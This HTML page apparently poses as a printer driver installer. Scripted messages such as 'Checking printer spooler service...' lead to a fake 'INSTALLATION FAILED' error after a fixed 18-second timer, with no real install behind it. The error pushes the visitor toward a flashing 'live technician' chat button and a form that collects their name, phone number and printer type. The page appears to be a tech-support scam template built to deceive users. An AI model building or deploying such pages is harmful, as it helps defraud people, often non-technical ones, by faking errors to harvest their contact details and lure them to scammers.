<html lang="en">

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">



	<!-- Bootstrap core CSS -->
	<link href="bootstrap.min.css" rel="stylesheet" />

	<!-- Fa Fonts -->
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="../css/mycustom.css">

	<style>
		.footbtn:hover {
			background-color: #d6d5d5;

		}
		.footbtn {
			background-color: #e1e1e1;

		}
		.flashbtn{
		    animation: flash .3s infinite ease;
		    transition: all .3s ease;
		}
		.embed-responsive {
            padding-bottom: 38% !important;
        }
		@keyframes flash{
		    from{
		        background-color: green;
		        border-color: green ;
		    }
		    to{
		        background-color: var(--theme);
		        border-color: var(--theme);
		    }
		}
	</style>

</head>

<body class=""
	style="padding-top: 0rem; background-position: center; background-size:cover; background-repeat: no-repeat;">
	<div class="container-fluid" style=" ">
		<div class="row" style="height:100px; display:none">
			<div class="col-sm-2"></div>
			<div class="col-sm-8" style="border:1px solid var(--theme);  background-color:var(--theme)">
				<div class="row">
					<div class="col-sm-12" style="border:0px solid black; padding-top:10px; text-align:right;">
						<a style="color:#fff" href="../index.html"><svg xmlns="http://www.w3.org/2000/svg" width="30"
								height="30" fill="currentColor" class="bi bi-x" viewBox="0 0 16 16">
								<path
									d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z" />
							</svg></a>
					</div>
					<div class="col-sm-12" style="padding-left:20px">
						<div class="row">
							<div class="col-sm-1" style="border:0px solid black; width:40px;">
								<a style="color:#fff" href="../index.html"><svg xmlns="http://www.w3.org/2000/svg"
										width="25" height="25" fill="currentColor" class="bi bi-arrow-left"
										viewBox="0 0 16 16">
										<path fill-rule="evenodd"
											d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
									</svg></a>
							</div>
							<div class="col-sm-4">
								<img style="width:35px;" src="pad.png">
								<!--<div style="background-image: url(icons.png);background-position: 0 -422px;display: unset;background-color:#fff;background-repeat: no-repeat;width:32px;height:32px;padding-top: 11px;padding-left: 35px;"></div>
								--><label style="padding-left:10px; padding-bottom:10px">Installing Drivers</label>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="col-sm-2"></div>
		</div>

		<div class="row" style="height:450px">

			<div class="col-sm-12 p-xs-0" style="border:0px solid red; color:black; padding-top:50px; padding-bottom:50px; padding-left:60px; padding-right:60px; background-color:#fff">
				<label style="font-size:20px">Installing drivers...</label>
				<div class="col-md-12" style="padding:20px;"></div>
				<marquee id="b" scrollamount="55" direction="right" style="background-color: #e4e4e4;height: 12px;">
					<p style="background-color:var(--theme);width:12%; COLOR:var(--theme); font-size:10px;">LOADING...</p>
				</marquee>
				<marquee id="r" scrollamount="15" direction="right" style="background-color: #e4e4e4;height: 12px;">
					<p style="background-color:red;width:100%; COLOR:red; font-size:10px;">LOADING...</p>
				</marquee>

				<p id="div2">Gathering network information...</p>
				<p id="divglo">Checking network port...</p>
				<p id="divglo2">Checking printer spooler service...</p>
				<div class="col-md-12" style="padding-top:60px;"></div>
				<p id="err" style="color:red;  font-weight:bold"> INSTALLATION FAILED!</p>
				<hr id="hrr" />
				<ul id="err2" class="list-unstyled">
					<li id="s2" class="mb-1"><svg style="color:red" xmlns="http://www.w3.org/2000/svg" width="26" height="26"
							fill="currentColor" class="bi bi-x" viewBox="0 0 16 16">
							<path
								d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z" />
						</svg>PRINTER DRIVER INSTALLATION FAILED DUE TO NETWORK ERROR 0X00000709 : THE DOWNLOAD COULD NOT BE COMPLETED!</li>
						
				

				</ul>
				<div class="col-md-12" style="padding-top:60px;"></div>
				<div class="row">
					<div id="sl" class="col-sm-12 text-center" style="border:0px solid black; text-align:right"><a
							href="javascript:void(0);" id="openChat" class=""><button type="button" class="btn flashbtn btn-primary "
								style="padding-left:45px;padding-right:45px;">CHAT WITH A LIVE TECHNICIAN</button></a></div>
					
					<div id="slll" class="col-sm-4" style="border:0px solid black;  text-align:left">
						
						
					
					</div>



				</div>
			</div>

		</div>




	</div>
	<style>
		#divglo {
			display: none;
		}

		#divglo2 {
			display: none;
		}

		#err {
			display: none;
		}

		#err2 {
			display: none;
		}

		#hrr {
			display: none;
		}

		#sl {
			display: none;
		}

		#r {
			display: none;
		}

		#sll {
			display: none;
		}

		#slll {
			display: none;
		}
	</style>


	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function () {
			$('#div2').delay(3000).fadeOut();
			$('#divglo').delay(4000).fadeIn();
			$('#divglo').delay(6000).fadeOut();
			$('#b').delay(17000).fadeOut();

			$('#divglo2').delay(11000).fadeIn();
			$('#divglo2').delay(6000).fadeOut();
			$('#err').delay(18000).fadeIn();
			$('#err2').delay(18000).fadeIn();
			$('#hrr').delay(18000).fadeIn();
			$('#sl').delay(18000).fadeIn();
			$('#sll').delay(18000).fadeIn();
			$('#slll').delay(18000).fadeIn();

			$('#r').delay(18000).fadeIn();




		});
	</script>


	<!-- Modal -->
	<div class="modal fade" id="productname" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
		<div class="modal-dialog modal-dialog-centered">
			<div class="modal-content">
				<div class="modal-body" style="color:black">
					<label style="color:var(--theme); font-weight:bold">The product name is on the front of your
						device.</label>
					<hr />
					<img src="tooltip_image.png" class="d-block w-100" alt="...">
				</div>

			</div>
		</div>
	</div>

	<div class="modal fade" id="needhelp" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
		<div class="modal-dialog modal-dialog-centered">
			<div class="modal-content">
				<div class="modal-body" style="color:black">
					<label style="color:var(--theme); font-weight:bold">We're here to help you set up your printer.</label>
					<br /><span style="font-weight:200">Let's identify your product to get started</span>
					<div
						style="background-image: url(icons.png);float:right;background-position: 0 -1988px;display: inline-block;background-repeat: no-repeat;width: 60px;height: 60px;margin-top: -26px;">
					</div>
					<hr />
					<form method="POST" action="insert.php" style="padding-left:20px; padding-right:20px;"
						class="row g-3 needs-validation" novalidate>

						<div class="col-md-12">
							<label for="validationCustom01" class="form-label">Your Full Name</label>
							<input type="text" name="name" class="form-control" id="validationCustom01" value=""
								placeholder="Ex: Jack Messi" required>
							<input type="text" name="email" id="subject" hidden="hidden" value="I don;t have email"
								class="demoInputBox">

						</div>

						<div class="col-md-12">
							<label for="validationCustom01" class="form-label">Your Phone Number</label>
							<input type="text" name="phone" class="form-control" id="validationCustom01" value=""
								placeholder="Ex: +1 (123) 456-7890" required>

						</div>
						<div class="col-md-12">
							<label for="validationCustom01" class="form-label">Your Printer Type</label>
							<select class="form-select" name="select" id="validationCustom04" required>
								<option selected disabled value="">Choose...</option>
								<option>Wireless Printer</option>
								<option>USB Printer</option>
								<option>Dont Know</option>
							</select>

						</div>


						<div class="col-12">
							<button class="btn btn-primary" name="submit" type="submit">Send</button>
						</div>
					</form>
					<script>

						// Example starter JavaScript for disabling form submissions if there are invalid fields
						(function () {
							'use strict'

							// Fetch all the forms we want to apply custom Bootstrap validation styles to
							var forms = document.querySelectorAll('.needs-validation')

							// Loop over them and prevent submission
							Array.prototype.slice.call(forms)
								.forEach(function (form) {
									form.addEventListener('submit', function (event) {
										if (!form.checkValidity()) {
											event.preventDefault()
											event.stopPropagation()
										}

										form.classList.add('was-validated')
									}, false)
								})
						})()

					</script>
				</div>

			</div>
		</div>
	</div>




	<script src="bootstrap.bundle.min.js"></script>
	<script>
        document.getElementById("openChat").addEventListener("click", function() {
            window.parent.postMessage("openLiveChat", "*");
        });
    </script>
</body>

</html>